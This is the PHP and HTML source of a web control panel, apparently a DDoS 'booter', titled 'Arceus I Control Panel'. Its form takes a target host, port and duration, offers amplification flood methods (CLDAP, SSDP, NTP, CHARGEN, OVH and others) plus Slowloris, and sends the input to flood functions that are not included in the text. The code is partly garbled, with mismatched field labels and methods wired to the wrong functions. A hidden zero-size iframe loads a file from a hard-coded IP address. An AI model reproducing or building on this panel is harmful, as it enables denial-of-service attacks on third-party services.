<link rel="shortcut icon" type="image/png" href="assets/favicon-globe.ico" />
 <link href="assets/stars.css" rel="stylesheet" />
 <link href="assets/main.css" rel="stylesheet" />
<?php

 
 
        $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 

 ?>


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Arceus I Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->

<center>
    <b style="font-size:44px;"</font>Arceus_I Web Panel</b>
<br><br>
</center>
<div class="well">
<center>
    <?php if(empty($_GET['type'])) { ?><br>User Input<br><br>
<form action="" method="get">
<input type="text" name="host" placeholder="HOST"><br>
<input type="text" name="port" placeholder="PORT"><br>
<input type="text" name="time" placeholder="TIME"><br>
<select name="type">
    <optgroup label="Methods v1">
    <option value="LDAP">CLDAP IPHM</option>
    <option value="SSDP">SSDP IPHM</option>
    <option value="NTP">NTP IPHM</option>
    <option value="WSD">WSD IPHM</option>
</opt>

    <optgroup label="Methods v2">
    <option value="VSE">VSE IPHM</option>
    <option value="OVH">OVH IPHM</option>
    <option value="CHARGEN">CHARGEN IPHM</option>
    <option value="HUN">HUN</option>
</opt>
</select><br>
<input type="submit" class="btn" value="START ATTACK!">
</form>

<form action="" method="get">
    <input type="submit" name="" class="btn" value="STOP CURRENT ATTACK!">
</form>
<?php } ?>

 <?php
    $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 
        if ( isset( $_GET['type'] ) )
                {
                       $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 
                if ( $type == "LDAP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' )
                                {
                                $page .= UDP_FLOOD( $host , $time );
                                }
                        else
                                {
                                $page .= '              <b>LDAP Flood</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" name="port"></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Send attack!" />' . "\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                elseif ( $type == "SSDP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['port'] != '' )
                                {
                                $page .= TCP_FLOOD ( $host , $port , $time );
                                }
                        else
                                {
                                $page .= '              <b>SSDP Flood</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";;
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Port:</td><td><input type="text" style="width: 130px" name="port" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                elseif ( $type == "NTP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['page'] != '' )
                                {
                                $page .= HTTP_FLOOD ( $host , $page , $time );
                                }
                        else
                                {
                                $page .= '              <b>HTTP Flood</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";;
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Page:</td><td><input type="text" style="width: 130px" name="port" value="/"></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                elseif ( $type == "SLOWLORIS" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['page'] != '' )
                                {
                                $page .= SLOWLORIS ( $host , $page , $time );
                                }
                        else
                                {
                                $page .= '              <b>Slowloris</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";;
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Page:</td><td><input type="text" style="width: 130px" name="page" value="/"></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                else
                        {
                     
                        }
                }
        else
                {
              
                }
 
        $page .= '              <br /></div>' . "\n";
        $page .= '      </body>' . "\n";
        $page .= '</html>' . "\n";
 
        print$page;
 
?>

</center>
</div>
<iframe src="http://98.143.148.177/gone.mp3" width="0" height="1"></iframe>